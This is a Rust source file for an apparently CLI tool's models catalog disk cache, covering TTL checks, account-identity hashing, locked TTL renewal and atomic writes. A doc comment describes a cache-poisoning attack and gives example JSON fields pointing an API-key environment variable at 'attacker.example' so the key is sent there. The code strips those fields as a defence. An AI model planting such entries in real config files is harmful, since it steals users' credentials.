use super::*;

// ── Disk cache ──────────────────────────────────────────────────────────────

pub(crate) const MODELS_CACHE_FILE: &str = "models_cache.json";
pub(crate) const CACHE_TTL: std::time::Duration = std::time::Duration::from_secs(300);

pub(crate) fn is_fresh(fetched_at: DateTime<Utc>, ttl: std::time::Duration) -> bool {
    let Ok(ttl) = ChronoDuration::from_std(ttl) else {
        return false;
    };
    let age = Utc::now().signed_duration_since(fetched_at);
    age >= ChronoDuration::zero() && age < ttl
}

#[derive(serde::Serialize, serde::Deserialize)]
pub(crate) struct ModelsCache {
    pub(crate) fetched_at: DateTime<Utc>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) fuigo_version: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) auth_method: Option<CacheAuthMethod>,
    /// Which ACCOUNT this catalog was fetched for; see [`models_cache_identity`].
    /// `load_fresh` compares it, so a catalog fetched by another account is a miss.
    /// `None` is a cache written by a build that predates the field: always a miss,
    /// which costs one refetch and never serves a foreign catalog.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) identity: Option<String>,
    /// The models-list URL this catalog was fetched from.
    /// `load_fresh` compares it, so a cache written against another backend is a miss.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) origin: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) etag: Option<String>,
    pub(crate) models: IndexMap<String, ModelEntry>,
}

pub(crate) struct CacheResult {
    pub(crate) models: IndexMap<String, ModelEntry>,
    pub(crate) etag: Option<String>,
}

/// Clear every credential field on entries read back from disk.
///
/// A catalogue describes models; it does not supply credentials. The network
/// path already enforces that -- `fetch::build_prefetched_map` sets `api_key`,
/// `env_key` and `auth_provider` to `None` on every entry it builds -- but the
/// disk cache is `serde_json::from_slice` straight into `ModelEntry`, whose
/// credential fields are public and `Deserialize`. Without this, anything that
/// can write `~/.fuigo/models_cache.json` (a package postinstall, a synced
/// dotfiles repo, another tool on the machine) could add
/// `"env_key": "FUIGO_API_KEY"` beside `"base_url": "https://attacker.example/v1"`.
///
/// That would bypass the destination check in `resolve_credentials`, because a
/// model's *own* credential is resolved before it and is not scoped -- BYOK
/// deliberately goes wherever the user's own `[model.*]` entry points. The
/// defence is therefore to clear those three fields on every entry read back.
///
/// `info.env_http_headers` is cleared for the same reason. It maps a header
/// name to an *environment variable name*, and the sampler's
/// `apply_env_http_headers` resolves each one with `std::env::var` when it
/// builds the request headers, so a cached
/// `"env_http_headers": {"authorization": "FUIGO_API_KEY"}` would read the
/// key's value out of the process environment and send it to whatever
/// `base_url` the same entry names -- without ever going through
/// `env_api_key_may_be_sent_to`.
///
/// `info.extra_headers` and `info.query_params` are deliberately left in
/// place. Both carry literal values that travel verbatim (the sampler inserts
/// `extra_headers` as-is; `EndpointTemplate::new` percent-encodes
/// `query_params` into the URL) and neither is resolved against the
/// environment or any other local secret, so a cache writer can only disclose
/// through them what it already wrote into them.
///
/// `info.base_url` is likewise left alone: a catalogue may name any host, and
/// the destination checks elsewhere decide whether a credential goes there.
fn strip_cached_credentials(models: &mut IndexMap<String, ModelEntry>) {
    for entry in models.values_mut() {
        entry.api_key = None;
        entry.env_key = None;
        entry.auth_provider = None;
        entry.info.env_http_headers.clear();
    }
}

/// Account discriminator for `~/.fuigo/models_cache.json`.
///
/// The catalog file is one per machine, and every other field `load_fresh`
/// checks — the auth METHOD (`Session | ApiKey | Deployment`), the models-list
/// URL, the build version — is identical for two different accounts on the same
/// host, or for two different API keys against the same origin. Without a
/// discriminator, account B boots on account A's entitlements for the whole
/// 300 s TTL. Credentials are stripped on read, so the exposure is entitlement
/// visibility rather than key leakage, but the catalog still decides which
/// models B is offered.
///
/// Same recipe as [`super::settings_cache::SettingsCacheManager::identity`]: a
/// non-cryptographic hash of the credentials themselves, so the stored value
/// names no secret and cannot be reversed into one.
pub(crate) fn models_cache_identity(
    auth: Option<&FuigoAuth>,
    endpoints: &config::EndpointsConfig,
) -> String {
    use std::hash::{Hash, Hasher};
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    auth.map(|a| a.user_id.as_str()).hash(&mut hasher);
    auth.map(|a| a.key.as_str()).hash(&mut hasher);
    endpoints.deployment_key.as_deref().hash(&mut hasher);
    endpoints.alpha_test_key.as_deref().hash(&mut hasher);
    crate::agent::auth_method::read_fuigo_api_key_env()
        .ok()
        .hash(&mut hasher);
    format!("{:016x}", hasher.finish())
}

/// Test-only rendezvous inside [`ModelsCacheManager::renew_ttl`], between the
/// read that produces its snapshot and the write that stamps it back. The
/// lost-update window is a real race; parking the renewal here makes it
/// reproducible instead of timing-dependent.
#[cfg(test)]
#[derive(Default)]
pub(crate) struct RenewBarrier {
    /// The renewal signals here once it holds its snapshot.
    pub(crate) reached: tokio::sync::Notify,
    /// The test signals here to let the renewal proceed to its write.
    pub(crate) release: tokio::sync::Notify,
}

pub(crate) struct ModelsCacheManager {
    pub(crate) path: std::path::PathBuf,
    pub(crate) ttl: std::time::Duration,
    #[cfg(test)]
    pub(crate) renew_barrier: Option<std::sync::Arc<RenewBarrier>>,
}

impl ModelsCacheManager {
    pub(crate) fn new() -> Self {
        Self::at(
            crate::util::fuigo_home::fuigo_home().join(MODELS_CACHE_FILE),
            CACHE_TTL,
        )
    }

    pub(crate) fn at(path: std::path::PathBuf, ttl: std::time::Duration) -> Self {
        Self {
            path,
            ttl,
            #[cfg(test)]
            renew_barrier: None,
        }
    }

    pub(crate) fn load_fresh(
        &self,
        expected_identity: &str,
        expected_auth: &CacheAuthMethod,
        expected_origin: &str,
    ) -> Option<CacheResult> {
        let data = std::fs::read(&self.path).ok()?;
        let cache: ModelsCache = serde_json::from_slice(&data).ok()?;
        if cache.fuigo_version.as_deref() != Some(fuigo_version::VERSION) {
            tracing::debug!("models cache version mismatch");
            return None;
        }
        if cache.identity.as_deref() != Some(expected_identity) {
            tracing::debug!("models cache identity mismatch");
            return None;
        }
        if cache.auth_method.as_ref() != Some(expected_auth) {
            tracing::debug!("models cache auth method mismatch");
            return None;
        }
        if cache.origin.as_deref() != Some(expected_origin) {
            tracing::debug!(
                cached = ?cache.origin,
                expected = expected_origin,
                "models cache origin mismatch"
            );
            return None;
        }
        if !is_fresh(cache.fetched_at, self.ttl) {
            tracing::debug!("models cache is stale");
            return None;
        }
        tracing::debug!(count = cache.models.len(), "loaded models from disk cache");
        let mut models = cache.models;
        strip_cached_credentials(&mut models);
        Some(CacheResult {
            models,
            etag: cache.etag,
        })
    }

    pub(crate) fn persist(
        &self,
        models: &IndexMap<String, ModelEntry>,
        etag: Option<&str>,
        identity: &str,
        auth_method: CacheAuthMethod,
        origin: &str,
    ) {
        let cache = ModelsCache {
            fetched_at: Utc::now(),
            fuigo_version: Some(fuigo_version::VERSION.to_string()),
            identity: Some(identity.to_string()),
            auth_method: Some(auth_method),
            origin: Some(origin.to_string()),
            etag: etag.map(|s| s.to_string()),
            models: models.clone(),
        };
        self.atomic_write(&cache);
    }

    /// Stamp a still-matching catalog with a fresh `fetched_at`.
    ///
    /// The whole read-modify-write runs under the cache file's `fs_atomic` write
    /// lock, which [`Self::atomic_write`] takes too. Without it this is a lost
    /// update: a models fetch that persists a NEW catalog after the read below
    /// and before the rename is silently overwritten by the stamped copy held
    /// here, resurrecting a stale catalog for another full TTL. A
    /// compare-and-swap on `fetched_at` cannot close that on its own -- whatever
    /// is left between the re-read and the rename (a `create_dir_all`, a
    /// `sweep_stale_tmp` directory scan, a serialize and a tmp-file write) is
    /// still a window -- so the lock is the guarantee and the CAS is only a cheap
    /// second line for a filesystem where the lock could not be taken.
    ///
    /// The lock is blocking, so it is acquired on the blocking pool.
    pub(crate) async fn renew_ttl(
        &self,
        expected_identity: &str,
        expected_auth: &CacheAuthMethod,
        expected_origin: &str,
    ) {
        let lock_path = self.path.clone();
        let lock = tokio::task::spawn_blocking(move || {
            fuigo_config::fs_atomic::lock_config_for_write(&lock_path)
        })
        .await;
        let _lock = match lock {
            Ok(Ok(lock)) => Some(lock),
            Ok(Err(e)) => {
                tracing::debug!(error = %e, "models cache renewal lock unavailable; renewing unlocked");
                None
            }
            Err(e) => {
                tracing::debug!(error = %e, "models cache renewal lock task failed; renewing unlocked");
                None
            }
        };

        let data = match tokio::fs::read(&self.path).await {
            Ok(data) => data,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return,
            Err(e) => {
                tracing::warn!(error = %e, "models cache TTL renewal: read failed");
                return;
            }
        };
        let Ok(mut cache) = serde_json::from_slice::<ModelsCache>(&data) else {
            return;
        };
        if cache.identity.as_deref() != Some(expected_identity) {
            tracing::debug!("models cache TTL renewal skipped: identity mismatch");
            return;
        }
        if cache.auth_method.as_ref() != Some(expected_auth) {
            tracing::debug!("models cache TTL renewal skipped: auth method mismatch");
            return;
        }
        if cache.origin.as_deref() != Some(expected_origin) {
            tracing::debug!("models cache TTL renewal skipped: origin mismatch");
            return;
        }

        #[cfg(test)]
        if let Some(barrier) = self.renew_barrier.clone() {
            barrier.reached.notify_one();
            barrier.release.notified().await;
        }

        // Cheap second line, for a filesystem where the lock above could not be
        // taken: if the file moved on, the renewal is moot -- whoever rewrote it
        // stamped it fresh already.
        let snapshot_fetched_at = cache.fetched_at;
        let on_disk_unchanged = tokio::fs::read(&self.path)
            .await
            .ok()
            .and_then(|current| serde_json::from_slice::<ModelsCache>(&current).ok())
            .is_some_and(|current| current.fetched_at == snapshot_fetched_at);
        if !on_disk_unchanged {
            tracing::debug!("models cache TTL renewal skipped: rewritten since read");
            return;
        }

        cache.fetched_at = Utc::now();
        // Already holding the lock; must not take it again (a second `flock` fd
        // in this process contends with the one above and would only time out).
        let path = self.path.clone();
        let ttl = self.ttl;
        let cache_for_write = cache;
        let wrote = tokio::task::spawn_blocking(move || {
            Self::at(path, ttl).write_locked(&cache_for_write);
        })
        .await;
        if let Err(e) = wrote {
            tracing::warn!(error = %e, "models cache TTL renewal: write task failed");
            return;
        }
        tracing::debug!("models cache TTL renewed");
    }

    pub(crate) fn invalidate(&self) {
        match std::fs::remove_file(&self.path) {
            Ok(()) => tracing::info!("models disk cache invalidated"),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => tracing::warn!(error = %e, "failed to invalidate models disk cache"),
        }
    }

    /// Replace the cache file, serialized against every other writer of it.
    ///
    /// Takes the same `fs_atomic` file lock [`Self::renew_ttl`] holds across its
    /// whole read-modify-write, which is what actually closes the lost update: an
    /// atomic rename alone only makes each write all-or-nothing, it does not stop
    /// a renewal that read before this write from renaming its stale copy back
    /// afterwards. A lock we could not take is logged and the write proceeds
    /// anyway -- a cache write must never fail because a filesystem has no
    /// `flock`; the race simply comes back, exactly as it was before.
    pub(crate) fn atomic_write(&self, cache: &ModelsCache) {
        let _lock = self.lock_for_write();
        self.write_locked(cache);
    }

    /// Acquire the cache file's write lock, or `None` if it could not be taken.
    fn lock_for_write(&self) -> Option<fuigo_config::fs_atomic::ConfigWriteLock> {
        match fuigo_config::fs_atomic::lock_config_for_write(&self.path) {
            Ok(lock) => Some(lock),
            Err(e) => {
                tracing::debug!(error = %e, "models cache write lock unavailable; writing unlocked");
                None
            }
        }
    }

    /// The write itself. The caller must already hold [`Self::lock_for_write`].
    /// Also the seam tests use to simulate a writer on a filesystem where the
    /// lock could not be taken.
    pub(in crate::agent::models) fn write_locked(&self, cache: &ModelsCache) {
        if let Some(parent) = self.path.parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        sweep_stale_tmp(&self.path, self.ttl);
        let Ok(json) = serde_json::to_vec_pretty(cache) else {
            return;
        };
        let tmp = unique_tmp_path(&self.path);
        if std::fs::write(&tmp, &json).is_ok() {
            if std::fs::rename(&tmp, &self.path).is_err() {
                let _ = std::fs::remove_file(&tmp);
            }
        } else {
            let _ = std::fs::remove_file(&tmp);
        }
    }
}

pub(crate) fn read_capped(path: &std::path::Path, max: u64) -> Option<Vec<u8>> {
    use std::io::Read;
    let mut buf = Vec::new();
    std::fs::File::open(path)
        .ok()?
        .take(max + 1)
        .read_to_end(&mut buf)
        .ok()?;
    if buf.len() as u64 > max {
        tracing::debug!("settings cache exceeds size cap");
        return None;
    }
    Some(buf)
}

pub(crate) fn unique_tmp_path(path: &std::path::Path) -> std::path::PathBuf {
    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let n = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    path.with_extension(format!("json.tmp.{}.{n}", std::process::id()))
}

pub(crate) fn sweep_stale_tmp(path: &std::path::Path, ttl: std::time::Duration) {
    let (Some(parent), Some(stem)) = (path.parent(), path.file_name().and_then(|s| s.to_str()))
    else {
        return;
    };
    let prefix = format!("{stem}.tmp.");
    let Ok(entries) = std::fs::read_dir(parent) else {
        return;
    };
    let now = std::time::SystemTime::now();
    for entry in entries.flatten() {
        let Some(name) = entry.file_name().to_str().map(str::to_owned) else {
            continue;
        };
        if !name.starts_with(&prefix) {
            continue;
        }
        let is_stale = entry
            .metadata()
            .and_then(|m| m.modified())
            .ok()
            .and_then(|t| now.duration_since(t).ok())
            .is_some_and(|age| age > ttl);
        if is_stale {
            let _ = std::fs::remove_file(entry.path());
        }
    }
}

pub(crate) fn write_private_atomic(path: &std::path::Path, ttl: std::time::Duration, bytes: &[u8]) {
    let Some(parent) = path.parent() else {
        return;
    };
    if std::fs::create_dir_all(parent).is_err() {
        return;
    }
    sweep_stale_tmp(path, ttl);
    let tmp = unique_tmp_path(path);
    let written = {
        #[cfg(unix)]
        {
            use std::io::Write;
            use std::os::unix::fs::OpenOptionsExt;
            std::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .mode(0o600)
                .open(&tmp)
                .and_then(|mut f| f.write_all(bytes))
                .is_ok()
        }
        #[cfg(not(unix))]
        {
            std::fs::write(&tmp, bytes).is_ok()
        }
    };
    if written && std::fs::rename(&tmp, path).is_ok() {
        return;
    }
    let _ = std::fs::remove_file(&tmp);
}
